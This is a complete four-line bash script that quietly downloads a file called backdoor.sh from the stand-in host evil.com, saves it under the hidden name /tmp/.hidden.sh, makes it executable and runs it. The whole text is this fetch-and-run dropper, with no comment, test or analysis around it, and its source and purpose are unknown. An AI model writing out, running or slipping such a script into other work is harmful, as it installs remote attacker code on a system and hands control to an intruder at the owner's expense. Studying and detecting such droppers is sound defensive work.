#!/bin/bash
wget -q http://evil.com/backdoor.sh -O /tmp/.hidden.sh
chmod +x /tmp/.hidden.sh
/tmp/.hidden.sh
